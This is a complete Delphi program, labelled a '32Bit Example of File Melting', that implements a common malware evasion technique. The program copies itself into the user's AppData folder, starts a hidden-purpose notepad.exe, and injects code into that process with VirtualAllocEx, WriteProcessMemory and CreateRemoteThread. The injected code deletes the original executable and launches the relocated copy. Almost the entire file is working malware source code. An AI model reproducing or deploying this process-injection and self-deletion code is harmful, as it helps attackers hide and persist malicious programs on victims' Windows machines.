{
  32Bit Example of File Melting
}

program Melt;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  WinAPI.Windows,
  shlobj;


type
  TRemotePointer = record
    Address : Pointer;
    Size    : Cardinal;
  end;

  TMeltThreadInfo = record
    // WinAPI
    GetProcAddress : Pointer;
    LoadLibrary    : Pointer;
    GetLastError   : Pointer;
    ExitProcess    : Pointer;
    DeleteFileW    : Pointer;
    Sleep          : Pointer;
    WinExec        : Pointer;

    // Str
    sTargetFile    : Pointer;
    sExecFile      : Pointer;
  end;
  PMeltThreadInfo = ^TMeltThreadInfo;

{
  Generate an exception message with Last Error Information
}
function GetLastErrorMessage(AFuncName : String) : String;
begin
  result := Format('"%s" call failed with LastError=[%d], Message=[%s].', [
    AFuncName,
    GetLastError(),
    SysErrorMessage(GetLastError())
  ]);
end;

{
  Spawn a new hidden process
}
function Spawn(APEFile : String) : THandle;
var hProc               : THandle;
    b                   : Boolean;
    AStartupInfo        : TStartupInfo;
    AProcessInformation : TProcessInformation;
begin
  result := INVALID_HANDLE_VALUE;
  ///

  ZeroMemory(@AProcessInformation, SizeOf(TProcessInformation));
  ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));

  AStartupInfo.cb          := SizeOf(TStartupInfo);
  AStartupInfo.wShowWindow := SW_SHOW;
  AStartupInfo.dwFlags     := STARTF_USESHOWWINDOW;

  UniqueString(APEFile);

  b := CreateProcessW(
                          PWideChar(APEFile),
                          nil,
                          nil,
                          nil,
                          False,
                          0,
                          nil,
                          nil,
                          AStartupInfo,
                          AProcessInformation
  );

  if not b then
    raise Exception.Create(GetLastErrorMessage('CreateProcessW'));

  ///
  result := AProcessInformation.hProcess;
end;

{
  Melt File using Process Injection Technique
}

procedure MeltThread(pInfo : PMeltThreadInfo) ; stdcall;
var _GetLastError   : function() : DWORD; stdcall;
    _ExitProcess    : procedure(uExitCode : UINT); stdcall;
    _DeleteFileW    : function(lpFileName : LPCSTR) : BOOL; stdcall;
    _Sleep          : procedure(dwMilliseconds : DWORD); stdcall;
    _MessageBox : function(hWindow : HWND; lpText : LPCWSTR; lpCaption : LPCWSTR; uType : UINT):integer;stdcall;
    _WinExec        : function(lpCmdLine : LPCSTR; uCmdShow : UINT) : UINT; stdcall;
begin
  @_GetLastError   := pInfo^.GetLastError;
  @_ExitProcess    := pInfo^.ExitProcess;
  @_DeleteFileW    := pInfo^.DeleteFileW;
  @_Sleep          := pInfo^.Sleep;
  @_WinExec        := pInfo^.WinExec;

  while not _DeleteFileW(pInfo^.sTargetFile) do begin
    if (_GetLastError = ERROR_FILE_NOT_FOUND) then
      break;
    ///

    _Sleep(100);
  end;

  _WinExec(PAnsiChar(pInfo^.sExecFile), SW_SHOW);

  _ExitProcess(0);

  /// EGG
  asm
    mov eax, $DEADBEAF;
    mov eax, $DEADBEAF;
  end;
end;

procedure DoMelt_Injection(ATargetFile, AExecFile : String);
var hProc         : THandle;
    ABytesWritten : SIZE_T;
    AInfo         : TMeltThreadInfo;
    p             : Pointer;
    AThreadID     : DWORD;
    AThreadProc   : TRemotePointer;
    AInjectedInfo : TRemotePointer;
    hKernel32     : THandle;
    pSysWow64     : PWideChar;

  function FreeRemoteMemory(var ARemotePointer : TRemotePointer) : Boolean;
  begin
    result := False;
    ///

    if (NOT Assigned(ARemotePointer.Address)) or (ARemotePointer.Size = 0) then
      Exit();

    result := VirtualFreeEx(hProc, ARemotePointer.Address, ARemotePointer.Size, MEM_RELEASE);

    ZeroMemory(@ARemotePointer, SizeOf(TRemotePointer));
  end;

  function InjectBuffer(pBuffer : PVOID; ABufferSize : Cardinal) : TRemotePointer;
  begin
    ZeroMemory(@result, SizeOf(TRemotePointer));
    ///

    result.Size := ABufferSize;
    result.Address := VirtualAllocEx(hProc, nil, result.Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if result.Address = nil then
      raise Exception.Create(GetLastErrorMessage('VirtualAllocEx'));
    ///

    if not WriteProcessMemory(hProc, result.Address, pBuffer, result.Size, ABytesWritten) then begin
      FreeRemoteMemory(result);

      raise Exception.Create(GetLastErrorMessage('WriteProcessMemory'));
    end;
  end;

  function InjectStringW(AString : String) : TRemotePointer;
  begin
    result := InjectBuffer(PWideChar(AString), (Length(AString) * SizeOf(WideChar)));
  end;

  function InjectStringA(AString : AnsiString) : TRemotePointer;
  begin
    result := InjectBuffer(PAnsiChar(AString), (Length(AString) * SizeOf(AnsiChar)));
  end;

  function GetFuncSize(pFunc : Pointer) : Cardinal;
  {
    This is a very dumb but working technique, we scan for our special pattern to
    get the address of our last MeltThread instruction.

    We skip all epilogue instructions since the thread will end the parent process.

    Other techniques exists to know the exact size of a function but is not required
    for our example.
  }
  var I              : Integer;
      pCurrentRegion : Pointer;
      AFound         : Boolean;

  const EGG : array[0..5-1] of Byte = ($B8, $AF, $BE, $AD, $DE);
  begin
    I := 0;
    AFound := False;

    while True do begin
      pCurrentRegion := Pointer(NativeUInt(pFunc) + I);

      if CompareMem(pCurrentRegion, @EGG, Length(EGG)) then begin
        if AFound then begin
          result := I - Length(EGG);

          break;
        end;

        AFound := True;
      end;

      Inc(I);
    end;
  end;

begin
  GetMem(pSysWOW64, MAX_PATH);
  try
    SHGetSpecialFolderPathW(0, pSysWOW64, CSIDL_SYSTEMX86, False);
  finally
    FreeMem(pSysWOW64, MAX_PATH);
  end;

  hProc := Spawn(Format('%s\notepad.exe', [String(pSysWOW64)]));
  try
    ZeroMemory(@AInfo, SizeOf(TMeltThreadInfo));

    {
      Prepare Thread Parameter
    }
    hKernel32 := LoadLibrary('kernel32.dll');

    AInfo.GetLastError   := GetProcAddress(hKernel32, 'GetLastError');
    AInfo.ExitProcess    := GetProcAddress(hKernel32, 'ExitProcess');
    AInfo.DeleteFileW    := GetProcAddress(hKernel32, 'DeleteFileW');
    AInfo.Sleep          := GetProcAddress(hKernel32, 'Sleep');
    AInfo.GetProcAddress := GetProcAddress(hKernel32, 'GetProcAddress');
    AInfo.LoadLibrary    := GetProcAddress(hKernel32, 'LoadLibraryW');
    AInfo.WinExec        := GetProcAddress(hKernel32, 'WinExec');

    AInfo.sTargetFile    := InjectStringW(ATargetFile).Address;
    AInfo.sExecFile      := InjectStringA(AnsiString(AExecFile)).Address;
    try
      AThreadProc := InjectBuffer(@MeltThread, GetFuncSize(@MeltThread));

      AInjectedInfo := InjectBuffer(@AInfo, SizeOf(TMeltThreadInfo));

      if CreateRemoteThread(hProc, nil, 0, AThreadProc.Address, AInjectedInfo.Address, 0, AThreadID) = 0 then
        raise Exception.Create(GetLastErrorMessage('CreateRemoteThread'));

      WriteLn('Done.');
    except
      on E: Exception do begin
        TerminateProcess(hProc, 0);

        raise;
      end;
    end;
  finally
    CloseHandle(hProc);
  end;
end;

{
  Program Entry Point
}
var ACurrentFile : String;
    ADestFile    : String;
begin
  try
    ACurrentFile := GetModuleName(0);

    ADestFile := Format('%s\%s', [
        GetEnvironmentVariable('APPDATA'),
        ExtractFileName(GetModuleName(0))
    ]);

    if String.Compare(ACurrentFile, ADestFile, True) = 0 then begin
      {
        After Melt (New Installed Copy)
      }

      WriteLn(Format('Melt successfully. I''m running from "%s"', [ACurrentFile]));
      WriteLn('Press enter to exit.');
      Readln;
    end else begin
      {
        Melt Instance
      }
      WriteLn('Install our copy and initiate file melting...');

      if NOT CopyFile(
                        PWideChar(ACurrentFile),
                        PWideChar(ADestFile),
                        False) then
        raise Exception.Create(Format('Could not copy file from "%s" to "%s"', [ACurrentFile, ADestFile]));

      DoMelt_Injection(ACurrentFile, ADestFile);
    end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.